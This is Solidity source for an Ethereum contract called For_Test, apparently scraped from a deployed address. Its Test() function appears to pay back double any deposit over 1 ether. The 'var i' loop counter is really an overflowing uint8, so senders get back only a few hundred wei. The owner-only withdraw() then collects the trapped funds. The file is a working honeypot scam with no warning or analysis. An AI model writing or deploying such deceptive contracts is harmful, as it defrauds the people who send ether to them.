/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract For_Test at 0x752406CbFd32593Fc422DA69cdD702d1eaAdC121
*/
pragma solidity ^0.4.19;

contract For_Test
{
    address owner = msg.sender;
    
    function withdraw()
    payable
    public
    {
        require(msg.sender==owner);
        owner.transfer(this.balance);
    }
    
    function() payable {}
    
    function Test()
    payable
    public
    {
        if(msg.value>1 ether)
        {
            uint256 multi =0;
            uint256 amountToTransfer=0;
             
            
            for(var i=0;i<msg.value*2;i++)
            {
                multi=i*2;
                
                if(multi<amountToTransfer)
                {
                  break;  
                }
                else
                {
                    amountToTransfer=multi;
                }
            }    
            msg.sender.transfer(amountToTransfer);
        }
    }
}